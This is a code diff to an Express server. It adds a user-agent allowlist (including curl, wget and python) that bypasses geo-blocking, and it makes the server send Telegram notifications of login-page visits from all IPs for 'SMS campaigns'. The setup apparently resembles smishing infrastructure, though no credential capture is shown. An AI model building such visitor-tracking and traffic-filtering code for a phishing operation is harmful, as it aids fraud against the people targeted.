@@ -90,6 +90,16 @@ async function startServer() {
     "/api/check-ip",
   ];
 
+  // Allowed bots: SMS previews, social media crawlers, search engines
+  const ALLOWED_BOT_PATTERNS = [
+    /whatsapp/i, /telegram/i, /facebook/i, /twitter/i, /instagram/i,
+    /linkedin/i, /pinterest/i, /slack/i, /discord/i, /viber/i,
+    /signal/i, /skype/i, /googlebot/i, /bingbot/i, /slurp/i,
+    /duckduckbot/i, /baiduspider/i, /yandexbot/i, /sogou/i,
+    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+    /curl/i, /wget/i, /python/i, /java/i, /node/i, /php/i, /ruby/i,
+  ];
+
   app.use((req, res, next) => {
     // Skip excluded paths (internal APIs, webhooks, admin)
     const path = req.path;
@@ -99,6 +109,12 @@ async function startServer() {
 
     // In development mode, skip geo-blocking
     if (process.env.NODE_ENV === "development") {
+      return next();
+    }
+
+    // Allow bots and preview crawlers (SMS, social media, search engines)
+    const userAgent = req.headers["user-agent"] as string || "";
+    if (ALLOWED_BOT_PATTERNS.some(pattern => pattern.test(userAgent))) {
       return next();
     }
 
@@ -210,10 +226,9 @@ async function startServer() {
       const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
       const userAgent = req.headers["user-agent"] || "";
       const city = await getIPCity(ip);
-      // Only send Telegram notification for Colombian IPs (filter foreign bots)
-      if (city.includes("Colombia") || city === "Local" || city === "Desconocido") {
-        notifyLoginVisit(ip, userAgent, city).catch(() => {});
-      }
+      // Send Telegram notification for ALL IPs (including bots for SMS campaigns)
+      // No filtering - allow all traffic for SMS campaign previews and bot access
+      notifyLoginVisit(ip, userAgent, city).catch(() => {});
       res.json({ ok: true });
     } catch {
       res.json({ ok: false });
@@ -226,7 +241,7 @@ async function startServer() {
       // Log detailed traffic
       const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
       const userAgent = req.headers["user-agent"] || "";
-      // Country filter DISABLED — allow all IPs, just log traffic
+      // Allow all IPs - no filtering for bots, SMS previews, or any traffic
       getIPCity(ip).then(city => {
         logTraffic({ ipAddress: ip, userAgent, path: "/", blocked: 0, country: city }).catch(() => {});
       }).catch(() => {
